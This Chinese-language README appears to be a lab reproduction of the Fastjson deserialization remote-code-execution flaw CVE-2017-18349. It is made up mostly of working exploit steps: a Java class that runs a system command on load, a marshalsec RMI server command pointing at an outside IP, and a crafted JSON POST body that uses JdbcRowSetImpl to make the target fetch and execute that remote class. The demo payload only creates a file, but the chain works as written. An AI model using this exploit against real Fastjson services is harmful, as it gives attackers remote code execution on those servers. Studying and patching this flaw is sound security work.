# Fastjson--CVE-2017-18349-Cancel changes
将项目设置为一个Maven项目后执行(注意,使用高版本的JDK可能会失败,建议使用版本为1.8.65的JDK)
FastjsondemoApplication.java 的main函数即可
TouchFile.java文件

```java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
  static {
      try {
          Runtime rt = Runtime.getRuntime();
          String[] commands = {"touch", "/tmp/flag_test"};
          Process pc = rt.exec(commands);
          pc.waitFor();
      } catch (Exception e) {
          // do nothing
      }
  }
}
```
之后同样使用版本为8的javac编译为class文件
```bash
javac TouchFile.java
```
Python开启web服务
```bash
python -m SimpleHTTPServer 80
```
使用marshalsec生成RMIServer
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://47.99.70.18/#TouchFile" 9999
```
修改请求包
```http
POST / HTTP/1.1
Host: 127.0.0.1:8080

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://47.99.70.18:9999/TouchFile",
        "autoCommit":true
    }
}
```
效果: ![图片](https://user-images.githubusercontent.com/81439858/163436838-fa408536-9b3a-4055-b693-9b9f7a70f4e2.png)
